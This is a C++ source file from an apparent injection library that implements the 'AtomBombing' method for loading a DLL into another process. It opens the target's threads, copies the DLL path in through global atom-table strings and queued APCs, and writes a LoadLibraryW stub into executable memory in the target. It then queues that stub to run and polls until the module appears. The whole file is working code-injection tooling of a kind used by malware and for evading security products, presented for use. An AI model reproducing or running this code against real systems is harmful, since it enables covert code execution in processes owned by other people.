#include "inject/common.hpp"
#include "inject/techniques.hpp"
#include "win/raii.hpp"

#include <algorithm>
#include <string>
#include <vector>

namespace hdl {
namespace inject {
namespace {

using NtAlertThread_t = NTSTATUS(NTAPI*)(HANDLE ThreadHandle);

void ReleaseAtoms(std::vector<ATOM>& atoms) {
    for (ATOM a : atoms) {
        GlobalDeleteAtom(a);
    }
    atoms.clear();
}

HdlStatus CreatePathAtoms(const wchar_t* dll_path, std::vector<ATOM>& atoms_out,
                          std::vector<size_t>& chunk_lens_out) {
    const size_t len = wcslen(dll_path);
    atoms_out.clear();
    chunk_lens_out.clear();
    atoms_out.reserve((len / 255) + 1);
    chunk_lens_out.reserve((len / 255) + 1);

    size_t off = 0;
    while (off < len) {
        const size_t n = (std::min)(static_cast<size_t>(255), len - off);
        const std::wstring chunk(dll_path + off, n);
        const ATOM atom = GlobalAddAtomW(chunk.c_str());
        if (!atom) {
            ReleaseAtoms(atoms_out);
            chunk_lens_out.clear();
            return HDL_E_FAILED;
        }
        atoms_out.push_back(atom);
        chunk_lens_out.push_back(n);
        off += n;
    }
    return HDL_OK;
}

HdlStatus QueueAtomPathWrites(HANDLE thread, void* remote_path, const std::vector<ATOM>& atoms,
                              const std::vector<size_t>& chunk_lens) {
    size_t off = 0;
    for (size_t i = 0; i < atoms.size(); ++i) {
        auto* dest = static_cast<wchar_t*>(remote_path) + off;
        const HdlStatus st =
            AtomWriteW(thread, atoms[i], dest, static_cast<ULONG>(chunk_lens[i] + 1));
        if (st != HDL_OK) {
            return st;
        }
        off += chunk_lens[i];
    }
    return HDL_OK;
}

void NudgeAlertable(HANDLE thread) {
    auto nt_alert = reinterpret_cast<NtAlertThread_t>(
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtAlertThread"));
    if (nt_alert) {
        nt_alert(thread);
    }
}

} // namespace

HdlStatus AtomBombingMethod(uint32_t pid, const wchar_t* dll_path, uint64_t* out_base) {
    auto nt_q = GetNtQueueApcThread();
    auto load_library = GetKernel32Proc("LoadLibraryW");
    if (!nt_q || !load_library) {
        return HDL_E_NOT_FOUND;
    }

    win::unique_handle process(OpenTargetProcess(pid));
    if (!process) {
        return HDL_E_ACCESS;
    }

    const auto tids = EnumProcessThreads(pid);
    if (tids.empty()) {
        return HDL_E_NOT_FOUND;
    }

    // Try newest threads first — alertable workers are usually created after the main thread.
    HdlStatus st = HDL_E_FAILED;
    std::vector<ATOM> live_atoms;

    for (size_t ti = tids.size(); ti-- > 0;) {
        win::unique_handle thread(
            OpenThread(THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION | 0x0004 /*THREAD_ALERT*/,
                       FALSE, tids[ti]));
        if (!thread) {
            thread.reset(
                OpenThread(THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, tids[ti]));
        }
        if (!thread) {
            continue;
        }

        std::vector<ATOM> atoms;
        std::vector<size_t> chunk_lens;
        if (CreatePathAtoms(dll_path, atoms, chunk_lens) != HDL_OK) {
            continue;
        }

        // Fresh buffers per attempt so leftover APCs on other threads cannot clobber a winner.
        RemoteAlloc path_mem;
        RemoteAlloc stub_mem;
        const size_t path_bytes = (wcslen(dll_path) + 1) * sizeof(wchar_t);
        if (!path_mem.Alloc(process.get(), path_bytes, PAGE_READWRITE) ||
            !stub_mem.Alloc(process.get(), sizeof(X64LoadLibraryStub), PAGE_EXECUTE_READWRITE)) {
            ReleaseAtoms(atoms);
            continue;
        }

        X64LoadLibraryStub stub{};
        stub.path = reinterpret_cast<uint64_t>(path_mem.ptr);
        stub.loadlib = reinterpret_cast<uint64_t>(load_library);

        if (QueueAtomPathWrites(thread.get(), path_mem.ptr, atoms, chunk_lens) != HDL_OK ||
            ApcMemsetWrite(thread.get(), stub_mem.ptr, &stub, sizeof(stub)) != HDL_OK) {
            ReleaseAtoms(atoms);
            continue;
        }

        NTSTATUS nt = nt_q(thread.get(), stub_mem.ptr, nullptr, nullptr, nullptr);
        if (nt < 0) {
            nt = nt_q(thread.get(), reinterpret_cast<PVOID>(load_library), path_mem.ptr, nullptr,
                      nullptr);
        }
        if (nt < 0) {
            ReleaseAtoms(atoms);
            continue;
        }

        NudgeAlertable(thread.get());
        const HdlStatus poll = PollForModule(pid, dll_path, out_base, 20, 100);

        if (poll == HDL_OK) {
            // Keep atoms alive until process exit of injector scope — pending APCs may still run.
            live_atoms.insert(live_atoms.end(), atoms.begin(), atoms.end());
            atoms.clear();
            path_mem.Detach();
            stub_mem.Detach();
            st = HDL_OK;
            break;
        }

        // Keep atoms alive: non-alertable threads may still hold GetAtomNameW APCs.
        live_atoms.insert(live_atoms.end(), atoms.begin(), atoms.end());
        atoms.clear();
        path_mem.Detach();
        stub_mem.Detach();
    }

    // Atoms intentionally leaked for process lifetime of the injector call; deleting while APCs
    // may still be queued races GetAtomNameW. Release if we own the process inject attempt end
    // after a short grace for alertable drain.
    Sleep(50);
    ReleaseAtoms(live_atoms);

    if (st == HDL_OK) {
        HDL_LOG_INFO("AtomBombing (full) inject into pid %u ok", pid);
    } else {
        HDL_LOG_ERROR("AtomBombing: writes queued but module not observed (need alertable wait)");
    }
    return st;
}

} // namespace inject
} // namespace hdl
